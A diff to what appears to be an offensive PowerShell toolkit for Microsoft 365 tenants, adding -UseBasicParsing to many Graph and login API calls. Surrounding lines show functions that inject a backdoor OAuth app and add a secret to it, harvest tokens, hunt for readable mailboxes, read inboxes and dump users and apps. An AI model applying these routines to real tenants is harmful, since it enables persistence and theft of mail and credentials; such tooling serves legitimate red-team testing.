@@ -563,7 +563,7 @@ function Invoke-InjectOAuthApp{
     do {
         # Invoke the web request
         try{
-            $response = Invoke-WebRequest -Uri $initialUrl -Headers $headers
+            $response = Invoke-WebRequest -UseBasicParsing -Uri $initialUrl -Headers $headers
         }catch{
             Write-Host -ForegroundColor Red "[*] Something went wrong."
             return
@@ -591,7 +591,7 @@ function Invoke-InjectOAuthApp{
 
     # Get Object IDs of individual permissions
     Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
-    $spns = Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
+    $spns = Invoke-WebRequest -UseBasicParsing -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
     $spnsjson = $spns.Content | ConvertFrom-Json
 
     if ($Scope -like "op backdoor")
@@ -686,7 +686,7 @@ $resources = @"
     }
     $SecretBody = $secretCredential | ConvertTo-Json
     $applicationid = $appresponse.id
-    $secretrequest = Invoke-WebRequest -Headers $Headers -Method POST -ContentType "application/json" -Body $SecretBody -Uri "https://graph.microsoft.com/v1.0/applications/$applicationid/addPassword"
+    $secretrequest = Invoke-WebRequest -UseBasicParsing -Headers $Headers -Method POST -ContentType "application/json" -Body $SecretBody -Uri "https://graph.microsoft.com/v1.0/applications/$applicationid/addPassword"
 
     $secretdata = $secretrequest.Content |ConvertFrom-json
 
@@ -995,7 +995,7 @@ Function Invoke-GraphOpenInboxFinder{
         $request = ""
         Write-Host -nonewline "$curr_mbx of $count mailboxes checked`r"
         $curr_mbx += 1
-        try { $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$mbx/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"} 
+        try { $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$mbx/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"} 
         }catch{
             $err = $_.Exception.Response.StatusCode.Value__
         }
@@ -1084,7 +1084,7 @@ Function Get-AzureAppTokens{
     }
 
     try{
-    $request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
+    $request = Invoke-WebRequest -UseBasicParsing -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
     }
     catch{
     $details=$_.ErrorDetails.Message | ConvertFrom-Json
@@ -1125,7 +1125,7 @@ Function Invoke-CheckAccess{
     $Tokens = ""
     )
     $access_token = $tokens.access_token
-    $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/me" -Headers @{"Authorization" = "Bearer $access_token"}
+    $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/me" -Headers @{"Authorization" = "Bearer $access_token"}
     $out = $request.Content | ConvertFrom-Json
     $out
 }
@@ -1147,7 +1147,7 @@ Function Get-UserObjectID{
     $upn = ""
     )
     $access_token = $tokens.access_token
-    $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$upn" -Headers @{"Authorization" = "Bearer $access_token"}
+    $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$upn" -Headers @{"Authorization" = "Bearer $access_token"}
     $out = $request.Content | ConvertFrom-Json
     $out.id
 }
@@ -1225,7 +1225,7 @@ Param
     client_secret=$ClientSecret
     }
 
-    $request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
+    $request = Invoke-WebRequest -UseBasicParsing -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
     $global:apptokens = $request.Content | ConvertFrom-Json
     Write-Output "---Here is your access token---"
     $apptokens.access_token
@@ -1415,7 +1415,7 @@ Function Get-Inbox{
     $access_token = $tokens.access_token   
     [string]$refresh_token = $tokens.refresh_token 
 
-    $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages?`$top=$TotalMessages" -Headers @{"Authorization" = "Bearer $access_token"}
+    $request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages?`$top=$TotalMessages" -Headers @{"Authorization" = "Bearer $access_token"}
     $out = $request.Content | ConvertFrom-Json
     $resultsList = @()
     foreach ($hit in $out.value) {
@@ -1748,7 +1748,7 @@ Function Get-AzureADUsers{
     $userlist = @()
     do{
         try{
-		$request = Invoke-WebRequest -Method GET -Uri $usersEndpoint -Headers @{"Authorization" = "Bearer $access_token"}
+		$request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri $usersEndpoint -Headers @{"Authorization" = "Bearer $access_token"}
         }catch {
 		if($_.Exception.Response.StatusCode.value__ -match "429"){
                 Write-Host -ForegroundColor red "[*] Being throttled... sleeping 5 seconds"
@@ -2133,7 +2133,7 @@ Function Invoke-DumpApps{
     # Loop until there's no more nextLink
     do {
         # Invoke the web request
-        $response = Invoke-WebRequest -Uri $initialUrl -Headers $headers
+        $response = Invoke-WebRequest -UseBasicParsing -Uri $initialUrl -Headers $headers
 
         # Convert the response content to JSON
         $jsonData = $response.Content | ConvertFrom-Json
@@ -2160,7 +2160,7 @@ Function Invoke-DumpApps{
     if(!$GraphRun){
     Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects..."
     }
-    $spns = Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
+    $spns = Invoke-WebRequest -UseBasicParsing -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
     $spnsjson = $spns.Content | ConvertFrom-Json
 
     # Construct the Graph API endpoint
@@ -3692,7 +3692,7 @@ $soapRequest = @"
         Write-Host -ForegroundColor yellow "[*] Now trying to query the MS provisioning API for organization settings."
     }
     # Send the SOAP request to the provisioningwebservice
-    $response = Invoke-WebRequest -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $soapRequest
+    $response = Invoke-WebRequest -UseBasicParsing -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $soapRequest
 
 
     if ($response -match '<DataBlob[^>]*>(.*?)<\/DataBlob>') {
@@ -3742,7 +3742,7 @@ $GetCompanyInfoSoapRequest = @"
 </s:Envelope>
 "@
 
-    $companyinfo = Invoke-WebRequest -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $GetCompanyInfoSoapRequest
+    $companyinfo = Invoke-WebRequest -UseBasicParsing -Uri 'https://provisioningapi.microsoftonline.com/provisioningwebservice.svc' -Method Post -ContentType 'application/soap+xml; charset=utf-8' -Body $GetCompanyInfoSoapRequest
 
 
     $xml = [xml]$companyInfo
